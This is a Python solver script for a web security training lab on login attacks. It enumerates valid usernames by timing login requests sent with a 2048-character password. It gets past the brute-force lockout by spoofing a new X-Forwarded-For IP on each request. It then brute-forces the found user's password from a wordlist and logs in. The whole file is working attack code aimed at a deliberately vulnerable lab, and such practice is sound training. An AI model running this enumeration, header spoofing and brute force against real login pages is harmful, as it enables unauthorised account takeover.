from web_security_academy.core.utils import (
    auth_lab_usernames,
    auth_lab_passwords,
    print_info,
    print_info_secondary,
    print_success,
    print_fail,
)
from time import perf_counter


def solve_lab(session):
    usernames = auth_lab_usernames()
    passwords = auth_lab_passwords()
    print()

    # User enumeration
    print_info("Enumerating users by examining response times...")
    for i, user in enumerate(usernames):
        # Header used to bypass brute-force protection
        headers = {"X-Forwarded-For": f"192.168.0.{i+1}"}
        data = {"username": user, "password": "a" * 2048}

        start = perf_counter()
        resp = session.post_path("/login", data=data, headers=headers)
        end = perf_counter()

        response_time = end - start
        if response_time < 5:
            print_info_secondary(f"{user} => {response_time} seconds", end="\x1b[1K")
        else:
            print_success(f"{user} => {response_time} seconds\n")
            break
    else:
        print_fail("Unable to enumerate a valid username.")

    # Password enumeration
    print_info(f"Brute-forcing {user}'s password...")
    for i, password in enumerate(passwords):
        headers = {"X-Forwarded-For": f"192.168.0.{i+1}"}
        data = {"username": user, "password": password}
        resp = session.post_path(
            "/login", data=data, headers=headers, allow_redirects=False
        )

        if resp.status_code != 302:
            print_info_secondary(f"{password} => Incorrect", end="\x1b[1K")
        else:
            print_success(f"{password} => Correct!\n")
            break
    else:
        print_fail(f"Unable to brute-force {user}'s password.")

    session.login(user, password, with_csrf=False)
